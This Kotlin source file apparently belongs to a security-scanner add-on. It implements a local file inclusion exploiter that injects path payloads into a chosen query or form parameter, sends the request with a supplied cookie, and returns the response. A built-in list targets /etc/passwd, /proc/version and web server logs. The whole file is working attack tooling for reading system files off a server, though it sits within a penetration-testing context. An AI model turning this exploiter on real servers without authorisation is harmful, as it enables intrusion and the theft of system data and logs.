package me.d3s34.lfi

import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.request.*
import io.ktor.client.request.forms.*
import io.ktor.client.statement.*
import io.ktor.http.*
import org.zaproxy.addon.naf.model.LfiRequest
import java.net.URL

class LfiExploiter {
    suspend fun exploit(lfiRequest: LfiRequest): String {
        lfiRequest.url?.let {
            return exploit(
                lfiRequest.url,
                lfiRequest.param,
                lfiRequest.vectorAttack,
                lfiRequest.filePath,
                lfiRequest.data,
                lfiRequest.cookie
            )
        }
        return ""
    }

    suspend fun exploit(
        url: URL,
        param: String,
        vectorAttack: String,
        filePath: String,
        data: String? = null,
        cookie: String = "",
    ): String {
        val query = url.query?.let { parseQueryString(url.query) }

        val attackQuery = query
            ?.entries()
            ?.associate {
                if (it.key != param)  {
                    it.toPair()
                } else {
                    val (key, value) = it
                    val attackValue = value.map { transformToPayload(vectorAttack, filePath) }
                    Pair(key, attackValue)
                }
            }

        val attackParameters = attackQuery?.let { parametersOf(it) } ?: Parameters.Empty

        val attackUrl = URLBuilder(
            protocol = URLProtocol(url.protocol, if (url.port == -1) 80 else url.port),
            host = "${url.host}:${if (url.port == -1) 80 else url.port}",
            port = if (url.port == -1) 80 else url.port,
            pathSegments = url.path.split("/"),
            parameters = attackParameters
        ).build()

        return if (data.isNullOrEmpty()) {
            client.get(attackUrl.toString()) {
                header("Cookie", cookie)
            }.bodyAsText()
        } else {
            val bodyParsed = parseQueryString(data)

            val attackBody = bodyParsed
                .entries()
                .associate {
                    if (it.key == param) {
                        val (key, value) = it
                        val attackValue = value.map { transformToPayload(vectorAttack, filePath) }
                        Pair(key, attackValue)
                    } else {
                        it.toPair()
                    }
                }

            val bodyAttackParameters = parametersOf(attackBody)

            client.post(attackUrl) {
                setBody(FormDataContent(bodyAttackParameters))
                header("Cookie", cookie)
            }.bodyAsText()
        }
    }

    private fun transformToPayload(vectorAttack: String, filePath: String): String {
        return if (vectorAttack.contains(nixPattern)) {
            vectorAttack.replace(nixPattern, filePath.removePrefix("/"))
        } else if (vectorAttack.contains(windowsPattern)) {
            vectorAttack.replace(windowsPattern, filePath)
        } else {
            vectorAttack
        }
    }

    companion object {
        val client = HttpClient(CIO)

        const val nixPattern: String = "etc/passwd"
        const val windowsPattern: String = "Windows/system.ini"
        val nixFileProof = listOf(
            "/etc/passwd",
            "/proc/version",
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log"
        )
    }
}
